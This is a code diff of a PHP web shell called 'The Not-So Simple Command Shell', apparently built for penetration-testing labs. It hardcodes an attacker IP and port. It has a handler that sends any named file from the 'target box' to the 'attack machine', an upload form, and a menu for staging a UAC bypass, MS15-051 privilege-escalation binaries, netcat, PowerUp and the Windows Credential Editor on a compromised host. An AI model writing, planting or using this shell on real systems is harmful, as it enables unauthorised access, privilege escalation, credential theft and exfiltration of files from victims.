@@ -6,7 +6,24 @@
     <title>The Not-So Simple Command Shell by KaotickJ</title>
     </head>
     <body>
-        <?php
+<?php
+        if(isset($_GET['download'])) {
+            $filename = $_GET['download'];
+            if(file_exists($filename)) {
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/octet-stream');
+                header("Cache-Control: no-cache, must-revalidate");
+                header("Expires: 0");
+                header('Content-Disposition: attachment; filename="'.basename($filename).'"');
+                header('Content-Length: ' . filesize($filename));
+                header('Pragma: public');
+                flush();
+                readfile($filename);
+                die();
+            } else{
+                echo '<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>resource not found. make sure specified file exists on the target box</p></div>';
+            }
+        }
         $attackip = "10.0.2.6";
         $attackport = "8000";
         echo '
@@ -20,8 +37,8 @@
         <option>Choose</option>
         <option value="Invoke-WScriptBypassUAC.ps1" title="bypasses uac to execute vbscript code with elevated privileges.  you need to edit the code to make it usable">WScriptBypassUAC (Win7)</option>
         <option value="jaws-enum.ps1" title="Just Another Windows Enumeration Script - aka just the best windows enum script">JAWs Enum</option>
-        <option value="ms15-05132.exe" title="x86 only">MS15-051 x86 Priv Esc</option>
-        <option value="ms15-05164.exe" title="x64 only">MS15-051 x64 Priv Esc</option>
+        <option value="ms15-05132.exe" title="x86 only">MS15-051 Priv Esc</option>
+        <option value="ms15-05164.exe" title="x64 only">MS15-051 Priv Esc</option>
         <option value="nc.exe" title="netcat for windows x86 version">Netcat 32</option>
         <option value="nc64.exe" title="netcat for win x64">Netcat 64</option>
         <option value="PowerUp.ps1">PowerUp.ps1</option>
@@ -33,8 +50,8 @@
         <option value="wce-universal.exe" title="windows credential editor that only seems to work with xp">WCE Universal</option>
         </select><button type="submit">Upload</button>
         </form>
-        <p><or enter filename></p>
-        <form action="" method="get" enctype="multipart/form-data"><input name="upload" type="file" placeholder="File to Upload"/><button type="submit">Upload</button></form><br>
+        <p>&nbsp;</p>
+        <form action="" method="post" enctype="multipart/form-data"><input name="upload" type="file" placeholder="File to Upload"/><button type="submit">Upload</button></form><br>
         <form action="" method="get"><input type="text" name="download" placeholder="File to Download"/><button type="submit" title="downloads file to attack machine">Download</button></form>
         <form action="" method="get">
         <p>Quick Enum Options</p>
@@ -78,24 +95,6 @@
             echo '</pre>';
         }
 
-        if(isset($_GET['download'])) {
-            $filename = $_GET['download'];
-            if(file_exists($filename)) {
-                header('Content-Description: File Transfer');
-                header('Content-Type: application/octet-stream');
-                header("Cache-Control: no-cache, must-revalidate");
-                header("Expires: 0");
-                header('Content-Disposition: attachment; filename="'.basename($filename).'"');
-                header('Content-Length: ' . filesize($filename));
-                header('Pragma: public');
-                flush();
-                readfile($filename);
-                die();
-            } else{
-                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>resource not found. make sure specified file exists on the target box</p></div>');
-            }
-        }
-
         if (isset($_GET['upload'])) {
             if($_GET['upload'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
             if($_GET['upload'] == "Choose") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
@@ -124,6 +123,6 @@
             <a href="https://int0x33.medium.com/day-63-top-10-essential-nmap-scripts-for-web-app-hacking-c7829ff5ab7" target="_blank">Essential Nmap Scripts</a><br>
             <a href="https://int0x33.medium.com/day-26-the-complete-list-of-windows-post-exploitation-commands-no-powershell-999b5433b61e" target="_blank">Windows Post-Exploitation Commands</a>';
             }
-        ?>
+?>
     </body>
 </html>
